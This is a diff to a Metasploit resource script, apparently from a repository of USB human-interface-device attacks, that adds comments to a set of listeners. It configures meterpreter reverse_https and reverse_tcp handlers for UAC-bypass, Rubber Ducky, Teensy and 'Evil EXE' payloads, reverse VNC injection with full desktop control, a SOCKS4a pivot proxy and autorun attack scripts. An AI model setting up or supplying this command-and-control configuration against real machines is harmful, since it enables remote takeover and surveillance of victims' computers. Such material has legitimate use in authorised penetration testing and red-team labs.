@@ -1,3 +1,4 @@
+# x64 Handler - Used for bypass UAC 64 bit payload
 use exploit/multi/handler
 set PAYLOAD windows/x64/meterpreter/reverse_https
 set LHOST 192.168.1.101
@@ -6,33 +7,40 @@ set ExitOnSession false
 set AutoRunScript multi_console_command -rc /home/jhale/git/HID-Attacks/auto_test.rc
 exploit -j
 
+# Standard Handler - Useful for USB Rubber Ducky, Evil EXE's, etc.
 set PAYLOAD windows/meterpreter/reverse_https
 set LPORT 13003
 exploit -j
 
+# Standard Reverse TCP handler if the need arises. Useful for testing HTTPS vs TCP connections
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LPORT 13004
 exploit -j
 
+# Teensy Payload Handler - This will will run Teensy specific scripts.
 set PAYLOAD windows/meterpreter/reverse_https
 set AutoRunScript multi_console_command -rc /home/jhale/git/HID-Attacks/teensy_test.rc
 set LPORT 13008
 exploit -j
 
+# Full interaction VNC Handler
 set PAYLOAD windows/vncinject/reverse_tcp
 set LPORT 13005
 set ViewOnly false
 exploit -j
 
+# View-Only VNC Handler
 set PAYLOAD windows/vncinject/reverse_tcp
 set LPORT 13006
 set ViewOnly true
 exploit -j
 
+# Socks 4a Server - Used with Proxychains
 use auxiliary/server/socks4a
 set SVRHOST 127.0.0.1
 set SVRPORT 1080
 exploit -j
 
+# Load path to the provided MSF Modules
 loadpath /home/jhale/git/HID-Attacks/msf-modules
 
